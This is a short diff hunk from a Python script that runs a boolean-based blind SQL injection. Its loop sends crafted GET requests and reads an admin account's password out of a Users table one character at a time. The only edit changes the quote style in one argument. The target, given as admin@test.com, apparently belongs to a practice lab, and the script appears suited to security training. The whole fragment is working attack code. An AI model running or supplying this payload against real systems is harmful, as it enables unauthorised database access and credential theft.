@@ -75,7 +75,7 @@ for pos in range(1, 40):
     for c in chars:
         # Boolean-based: check if char at position matches
         payload = f"apple')) OR (SELECT SUBSTR(password,{pos},1) FROM Users WHERE email='admin@test.com')='{c}'--"
-        r = requests.get(url + requests.utils.quote(payload, safe=''))
+        r = requests.get(url + requests.utils.quote(payload, safe=""))
         if '"data"' in r.text:
             extracted += c
             print(f"[+] Position {pos}: {c} → Current: {extracted}")
